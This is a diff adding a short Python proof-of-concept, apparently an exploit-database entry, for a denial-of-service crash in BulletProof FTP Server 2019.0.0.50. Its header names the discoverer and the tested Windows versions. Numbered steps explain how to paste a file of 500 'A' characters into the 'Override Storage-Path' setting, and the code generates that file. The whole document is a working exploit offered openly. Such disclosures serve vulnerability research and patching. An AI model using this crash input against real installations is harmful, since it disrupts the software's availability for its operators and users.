@@ -1,0 +1,22 @@
+#Exploit Title: BulletProof FTP Server 2019.0.0.50 - 'Storage-Path' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-18
+#Vendor Homepage: http://bpftpserver.com/
+#Software Link: http://bpftpserver.com/products/bpftpserver/windows/download
+#Tested Version: 2019.0.0.50
+#Tested on: Windows 10 Single Language x64 / Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: BulletProof_Storage_Server_2019.0.0.50.py
+#2.- Open bullet_storage.txt and copy content to clipboard
+#3.- Open BulletProof FTP Server
+#4.- Select "Settings" > "Advanced"
+#5.- Enable "Override Storage-Path" and Paste Clipboard
+#6.- Click on "Save"
+#7.- Crashed
+
+cod = "\x41" * 500
+
+f = open('bullet_storage.txt', 'w')
+f.write(cod)
+f.close()
